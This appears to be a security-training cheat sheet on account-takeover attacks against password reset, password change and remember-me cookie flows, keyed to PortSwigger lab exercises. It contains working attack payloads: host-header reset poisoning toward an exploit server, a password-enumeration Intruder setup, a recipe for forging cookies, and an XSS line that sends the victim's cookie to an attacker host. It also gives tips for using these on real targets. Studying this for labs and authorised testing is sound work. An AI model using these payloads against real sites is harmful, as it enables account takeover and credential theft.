# Authentication — Other mechanisms (reset, change, remember-me)

The login page is usually hardened; the *supporting* flows are not. Password reset, password change, and "stay logged in" cookies each re-implement identity checks — and each leaks or breaks. Max impact: reset/take over an arbitrary account (often admin) without ever knowing its password.

## Quick reference

```
# password reset — broken logic
reset your own pw -> observe POST /forgot-password?temp-forgot-password-token=...
delete the token (URL + body), change username=carlos -> set carlos's password
# password reset — host poisoning
POST /forgot-password  +  X-Forwarded-Host: evil.exploit-server.net  (username=carlos)
-> victim's reset link points to your server -> read token from access log -> use real link with stolen token
# change-password brute force / enumeration
POST /my-account/change-password  username=carlos  current=§wordlist§  new1=123 new2=abc(differ!)
-> "New passwords do not match" = correct current pw ; "Current password is incorrect" = wrong
# stay-logged-in cookie
decode -> base64(username + ':' + md5(password))  -> brute-force / forge / crack offline
```
Decision list: can you create an account and inspect the reset/cookie format? Then forge it for the victim. Reset uses a token — is it re-validated on submit? Is the reset link host taken from `Host`/`X-Forwarded-Host`? Is the change-password username a hidden field you can edit?

## Root cause
Account-management flows trust client-controlled values (reset token not re-checked, `username` hidden field, `X-Forwarded-Host` used to build the reset link) or use predictable/forgeable secrets (cookie = base64 of username + unsalted MD5(password)).

## Find it (recon and detection)
- **Reset:** trigger your own reset; inspect the token (URL param?), whether the submit re-validates it, and whether the link host is influenced by `Host`/`X-Forwarded-Host`.
- **Change password:** is `username` a hidden field in the request? Do error messages differ for right-vs-wrong current password?
- **Remember-me:** decode the `stay-logged-in` cookie (base64?); is it `user:hash`? Is the hash unsalted MD5 of the password?

## Technique
**1. Reset broken logic (token not re-validated):** reset your own password; the submit `POST /forgot-password?temp-forgot-password-token=...` carries `username` as hidden input. In Repeater, delete the token value in both URL and body — reset still works ⇒ token isn't checked on submit. Change `username=carlos`, set a new password → you own Carlos's account.

**2. Reset poisoning via middleware (host header):** the reset email link is built from the request host. Add `X-Forwarded-Host: YOUR-EXPLOIT-SERVER` to `POST /forgot-password` with `username=carlos`. The victim's emailed link now points to your server; when (the lab) victim clicks, your access log captures `GET /forgot-password?...token=...`. Take that token, use the **real** reset URL with `temp-forgot-password-token=<stolen>`, set Carlos's password.

**3. Change-password brute force / enumeration:** `POST /my-account/change-password` includes `username` (editable hidden field) and `current-password`. Distinct messages: entering two *different* new passwords yields "Current password is incorrect" (wrong current) vs "New passwords do not match" (correct current). Set `username=carlos`, `new-password-1≠new-password-2`, Intruder `current-password` with Grep-match on "New passwords do not match" → that payload is Carlos's password.

**4. Stay-logged-in cookie (forge/brute/crack):**
- Decode: `wiener:51dc30ddc473d43a6011e9ebba6ca770` = `username:md5(password)`. Cookie = `base64(username + ':' + md5(pass))`.
- **Brute-force/forge:** Intruder on the cookie with payload-processing rules (MD5 → prefix `carlos:` → Base64-encode) over a password list; grep-match "Update email" (only shows when authenticated) → valid cookie = ATO.
- **Offline cracking:** steal the victim cookie via [stored XSS](../../XSS/) (`<script>document.location='//EXPLOIT/'+document.cookie</script>`), decode → `carlos:<md5>`, paste the unsalted MD5 into a search engine / crack with hashcat → plaintext password → log in.

**Advanced / edge cases:**
- **Send-password-by-email** designs leak persistent passwords over insecure channels.
- **Guessable reset param** (`reset?user=victim`) → direct takeover, no token.
- **Token not destroyed after use / no expiry** → replay.
- **Open-source remember-me schemes** → cookie construction is documented; no account creation needed.
- **Host header reset poisoning** variants: `Host`, `Host: host:badport`, duplicate `Host`, `X-Forwarded-Host`, `X-Host` — see [HTTP-Host-header-attacks](../../HTTP-Host-header-attacks/).

## Payload arsenal
```
# host-poison reset
POST /forgot-password ... \r\nX-Forwarded-Host: id.exploit-server.net\r\n ... username=carlos
# change-password enumeration (Intruder, grep "New passwords do not match")
username=carlos&current-password=§list§&new-password-1=123&new-password-2=abc
# stay-logged-in forge (Intruder payload processing, in order)
Hash: MD5  ->  Add prefix: carlos:  ->  Encode: Base64-encode
grep-match: "Update email"          # auth indicator
# XSS cookie steal
<script>document.location='//YOUR-EXPLOIT-SERVER/'+document.cookie</script>
```

## Bypasses
| Defense | Bypass |
|---|---|
| reset token in URL | token not re-validated on submit → delete it, change username |
| reset link host fixed | inject `X-Forwarded-Host`/`Host` → poison link → steal token |
| change-pw needs current pw | error-message oracle enumerates the current password |
| remember-me "encrypted" | base64 ≠ encryption; unsalted MD5 → crack/forge |
| login rate limit | cookie-guessing often isn't rate-limited (brute the cookie instead) |

## Exploitation walkthrough (reset broken logic)
1. Forgot-password → your username → click email link → reset your own pw, capturing `POST /forgot-password?temp-forgot-password-token=...` (with hidden `username`).
2. Repeater: blank the `temp-forgot-password-token` in URL **and** body → reset still succeeds ⇒ token unchecked.
3. Set `username=carlos`, new password = anything, send.
4. Log in as carlos with that password ⇒ solved.

## Chaining
- [XSS](../../XSS/) → steal remember-me cookie → offline crack (lab o3).
- Reset poisoning → [HTTP-Host-header-attacks](../../HTTP-Host-header-attacks/).
- Enumerated usernames from [Password-based-login](../Password-based-login/) feed reset/change attacks.
- ATO → [Access-control](../../Access-control/) / [Business-logic-vulnerabilities](../../Business-logic-vulnerabilities/).

## Tools
- **Burp Repeater:** reset token/host manipulation, change-pw probing.
- **Burp Intruder:** change-pw enumeration (grep-match), cookie brute-force with **payload processing** (MD5→prefix→Base64).
- **Burp Decoder/Inspector:** decode cookies.
- **Exploit server / Collaborator:** capture poisoned reset links / stolen cookies.
- **hashcat / online hash DBs:** crack unsalted MD5.

## Labs

### Password reset broken logic [Apprentice]
URL: /web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
- Reset own pw; the submit carries `username` + `temp-forgot-password-token`. Blank the token (URL+body) → still works → token unchecked. Set `username=carlos`, new pw → log in as carlos.
- Insight: token validated on link click but not on submit. Real-target transfer: re-send reset submit with a blank/garbage token and a swapped username.

### Brute-forcing a stay-logged-in cookie [Practitioner]
URL: .../lab-brute-forcing-a-stay-logged-in-cookie
- Cookie decodes to `base64(wiener:md5(pass))`. Intruder on cookie, payload-processing MD5→prefix `carlos:`→Base64 over password list, id=carlos, grep "Update email". The hit = valid forged cookie for carlos.
- Insight: predictable cookie = offline-guessable, dodges login rate limits. Real-target transfer: decode any remember-me cookie; if it's user+hash(pass), forge it.

### Offline password cracking [Practitioner]
URL: .../lab-offline-password-cracking
- Stay-logged-in cookie = `user:md5(pass)`. Steal victim's via stored XSS (`document.location='//EXPLOIT/'+document.cookie`). Decode → `carlos:26323c...`. Crack the unsalted MD5 (search engine/hashcat) → `onceuponatime`. Log in, delete account.
- Insight: unsalted hash in a stealable cookie → offline crack. Real-target transfer: combine XSS cookie theft with weak cookie crypto.

### Password reset poisoning via middleware [Practitioner]
URL: .../lab-password-reset-poisoning-via-middleware
- `POST /forgot-password` + `X-Forwarded-Host: EXPLOIT` with `username=carlos` → victim's reset link points to your server. Read the token from your access log; use the **real** reset URL with the stolen token to set carlos's password.
- Insight: reset link host derived from a spoofable header → token exfiltration. Real-target transfer: test `X-Forwarded-Host`/`Host` on reset endpoints; watch for your domain in the emailed link.

### Password brute-force via password change [Practitioner]
URL: .../lab-password-brute-force-via-password-change
- `POST /my-account/change-password` has editable `username`. With mismatched new passwords: "New passwords do not match" (correct current) vs "Current password is incorrect" (wrong). Set `username=carlos`, mismatched new pws, Intruder `current-password`, grep "New passwords do not match" → carlos's password. Log in.
- Insight: the change-password error messages form a password oracle, and the username is attacker-controlled. Real-target transfer: any change-password that accepts a username param + distinct error messages.

## Real-world notes
- Account-management flows are a top real-world ATO source (reset poisoning, predictable tokens, host-header reset links).
- Don't submit clients' real password hashes to online crackers (data exposure) — note the weakness instead.
- Impact: arbitrary-account reset/takeover is High–Critical; host-poisoning resets are a classic bug-bounty pattern.

## References
- https://portswigger.net/web-security/authentication/other-mechanisms
- https://portswigger.net/web-security/host-header/exploiting (reset poisoning)
